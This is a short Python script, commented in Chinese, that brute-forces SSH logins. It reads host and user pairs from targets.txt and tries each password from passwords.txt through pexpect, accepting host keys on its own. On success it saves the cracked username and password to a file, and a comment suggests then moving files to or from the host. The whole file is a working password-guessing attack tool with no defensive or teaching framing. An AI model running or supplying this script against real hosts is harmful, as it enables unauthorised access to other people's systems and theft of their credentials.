import pexpect



# 从passwords.txt文件中读取密码列表
with open('passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f.readlines()]

# 从targets.txt文件中读取目标列表
with open('targets.txt', 'r') as f:
    targets = [line.strip().split() for line in f.readlines()]



# 遍历用户名和密码列表，尝试登录
for target in targets:
    host = target[0]
    user = target[1]
    port = 22
    for password in passwords:
        print('Trying username:', user, 'password:', password)

        # 创建pexpect.spawn对象
        child = pexpect.spawn(f'ssh {user}@{host} -p {port}')

        # 可选：如果遇到yes/no询问时，自动回答yes并继续
        i = child.expect([pexpect.TIMEOUT, ".*[Yy]es.*[Nn]o.*", pexpect.EOF], timeout=1)
        if i == 1:
            child.sendline('yes')

        # 等待ssh提示符出现
        i = child.expect([pexpect.TIMEOUT, '[Pp]assword:'], timeout=10)
        if i == 0:
            print('登录超时')
            continue

        # 发送密码
        tries_remaining = 5
        while tries_remaining > 0:
            child.sendline(password)

            # 检查是否成功登录
            i = child.expect([pexpect.TIMEOUT, 'Last login:', '[Pp]assword:'], timeout=0.2)
            if i == 0:
                print('尝试登录超时')
                tries_remaining -= 1
            elif i == 1:
                print('成功登录！用户名：', user, '密码：', password)
                with open('{user}@{host}.txt', 'w') as t:
                    t.write('成功登录！用户名：'+ user + '密码：'+ password)
                # 可选：在此执行其他操作，例如上传/下载文件等
                exit()
                #break
            elif i == 2:
                print('密码不正确')
                break
            else:
                print('其它问题导致登录失败')
                tries_remaining -= 1

        if tries_remaining == 0:
            print(f'无法使用密码 {password} 登录，尝试下一个密码...')
